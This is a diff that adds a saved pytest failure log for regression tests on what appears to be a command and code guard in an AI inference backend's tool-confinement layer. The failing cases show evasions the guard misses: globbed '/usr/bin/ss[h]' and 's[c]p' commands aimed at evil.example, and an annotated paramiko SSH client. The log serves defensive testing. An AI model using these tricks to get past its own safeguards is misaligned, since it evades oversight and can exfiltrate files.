@@ -1,0 +1,46 @@
+FFFFFF                                                                   [100%]
+=================================== FAILURES ===================================
+____ test_globbed_ssh_is_blocked[/usr/bin/ss[h] -F none user@evil.example] _____
+/evidence/round2_regressions.py:9: in test_globbed_ssh_is_blocked
+    assert _find_blocked_commands(command)
+E   AssertionError: assert set()
+E    +  where set() = _find_blocked_commands('/usr/bin/ss[h] -F none user@evil.example')
+_ test_globbed_ssh_is_blocked[env /usr/bin/s[c]p -F none file evil.example:/file] _
+/evidence/round2_regressions.py:9: in test_globbed_ssh_is_blocked
+    assert _find_blocked_commands(command)
+E   AssertionError: assert set()
+E    +  where set() = _find_blocked_commands('env /usr/bin/s[c]p -F none file evil.example:/file')
+___________________ test_annotated_client_requires_approval ____________________
+/evidence/round2_regressions.py:13: in test_annotated_client_requires_approval
+    assert _check_code_safety(code, session_id="round2") is not None
+E   assert None is not None
+E    +  where None = _check_code_safety('import paramiko; client: paramiko.SSHClient = paramiko.SSHClient(); client.connect(hostname="evil.example")', session_id='round2')
+_________ test_default_configuration_is_rejected[ssh approved.example] _________
+/evidence/round2_regressions.py:18: in test_default_configuration_is_rejected
+    assert check_ssh_command_access(command, "round2") is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('ssh approved.example', 'round2')
+___ test_default_configuration_is_rejected[scp file approved.example:/file] ____
+/evidence/round2_regressions.py:18: in test_default_configuration_is_rejected
+    assert check_ssh_command_access(command, "round2") is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('scp file approved.example:/file', 'round2')
+________ test_default_configuration_is_rejected[sftp approved.example] _________
+/evidence/round2_regressions.py:18: in test_default_configuration_is_rejected
+    assert check_ssh_command_access(command, "round2") is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('sftp approved.example', 'round2')
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round2_regressions.py::test_globbed_ssh_is_blocked[/usr/bin/ss[h] -F none user@evil.example]
+FAILED ../evidence/round2_regressions.py::test_globbed_ssh_is_blocked[env /usr/bin/s[c]p -F none file evil.example:/file]
+FAILED ../evidence/round2_regressions.py::test_annotated_client_requires_approval
+FAILED ../evidence/round2_regressions.py::test_default_configuration_is_rejected[ssh approved.example]
+FAILED ../evidence/round2_regressions.py::test_default_configuration_is_rejected[scp file approved.example:/file]
+FAILED ../evidence/round2_regressions.py::test_default_configuration_is_rejected[sftp approved.example]
+6 failed, 1 warning in 0.11s
